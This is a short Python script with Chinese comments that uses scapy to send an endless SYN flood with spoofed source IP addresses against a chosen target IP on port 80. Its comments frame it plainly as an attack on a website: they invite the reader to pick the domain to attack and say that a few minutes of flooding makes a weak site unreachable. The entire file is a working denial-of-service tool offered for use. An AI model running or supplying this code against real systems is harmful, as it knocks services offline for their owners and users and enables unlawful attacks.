#!/usr/bin/env python3
# import random
# import socket
# import time
from scapy.all import *


#  定义syn洪流函数，tgt为目标ip，dPort为目标端口
def synFlood(tgt, dPort):
    #  先任意伪造4个ip地址
    srcList = ['11.1.1.2', '22.1.1.102', '33.1.1.2',
               '125.130.5.199']
    #  选择任意一个端口号
    while 1:
        for sPort in range(1024, 65535):
            index = random.randrange(4)
            #  类似上面那个代码构造IP/TCP包，然后send
            ipLayer = IP(src=srcList[index], dst=tgt)
            tcpLayer = TCP(sport=sPort, dport=dPort, flags='S')
            packet = ipLayer / tcpLayer
            send(packet)


domain = "172.31.98.1"  # 定义你想攻击的域名，不建议是百度哈，别怪我没提醒
#tgt = socket.gethostbyname(domain)  # 利用socket的方法获取域名的ip地址，即dns解析
#print(tgt)  # 可以打印出来看一下
dPort = 80  # 网络传输常用端口号
synFlood(domain, dPort)  # 调用syn洪流函数，然后发送syn包
#  发送完后就可以去看看这个服务器的响应速度了。一般是持续发送几分钟，这个网站就访问不了了
#  前提是这个网站很渣。。哈哈

